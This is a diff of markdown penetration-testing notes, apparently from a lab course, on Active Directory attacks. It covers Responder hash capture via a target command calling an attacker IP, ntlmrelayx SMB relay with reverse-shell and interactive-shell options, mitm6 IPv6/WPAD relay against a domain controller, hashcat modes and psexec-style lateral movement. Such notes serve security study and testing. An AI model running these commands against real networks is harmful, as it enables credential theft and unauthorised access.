@@ -1,33 +1,53 @@
-# responder.py
+	# responder.py
+
+## Getting users hash after getting shell
+```
 sudo responder -I eth0 -dwv
+```
 
 
-
-for SMB Relay 
-disable responding on smb and http edit /usr/share/responder/Responderr.conf
-
-## on windows
-you can get user ntlm hash after getting reverse shell on a target using responder and sending gci command 
 ```powershell
-
-sudo responder -I eth0
-gci \\10.10.10.10\test\test
+# you can get user ntlm hash after getting reverse shell on a target using responder and sending gci command 
+sudo responder -I eth0 # on attacker
+gci \\10.10.10.10\test\test # on target
 
 ```
-## ntlmrelayx.py
+
+
+## SMB Relay 
+
+First we need to:
+disable responding on SMB and HTTP edit
+```bash
+/usr/share/responder/Responder.conf # edit turn off smb and http
+```
+
+Then we configure ntlmrelayx.py
+
+### ntlmrelayx.py
+```bash
 ntlmrelayx.py -tf targets.txt -smb2support
--i for interactive shell
--e to execute a file (msfvenom rev shell etc.)
--c command (e.g. whoami)
--6 for IPv6
--t target 
--l loot
-IPv6 ldaps attack e.g. ntlmrelayx.py -6 -t ldaps://IP -wh (for wpad) fakewpad.marvel.local -l lootme
+
+-e # to execute a file (msfvenom rev shell etc.)
+-c # command (e.g. whoami)
+-6 # for IPv6
+-t # target 
+-l # loot
+# Getting interactive shell
+-i # for interactive shell
+
+
+ntlmrelayx.py -6 -t ldaps://IP -wh  fakewpad.marvel.local -l lootme # IPv6 ldaps attack e.g
+
+-w # wpad
+```
 
 
 ### nmap check
-nmap script to check for smb signing disabled
-nmap --script =smb2-security-mode.nse p445 IP/RANGE
+```bash
+# nmap script to check for smb signing disabled
+nmap --script=smb2-security-mode.nse -p445 IP/RANGE
+```
 
 
 # hashcat
@@ -48,16 +68,22 @@ NTLMv2 5600
 	usage 3 :
       psexec.py DOMAIN/USERNAME:PASSWORD@IP 
 
-More tools like psexec :
+## More tools like psexec :
 
-*Less noisy start with these smbexec/wmiexec*
+Less noisy start with these
+smbexec
+wmiexec
 
 # mitm6
-```
-mimt6 -d DOMAIN
-```
-then start relay attack using ntlmrelayx.py
+```bash
+mimt6 -d DOMAIN # start mimt6
 
-```
+# then start relay attack using ntlmrelayx.py
 ntlmrelayx.py -6 -t ldaps://DC_IP -wh fakewpad.DOMAIN -l loot
+
+
+-6 # IPv6
+-t # target Domain Controller
+-wh # wpad name eg. fakewpad.marvel.local
+-l # dump info to file called loot
 ```
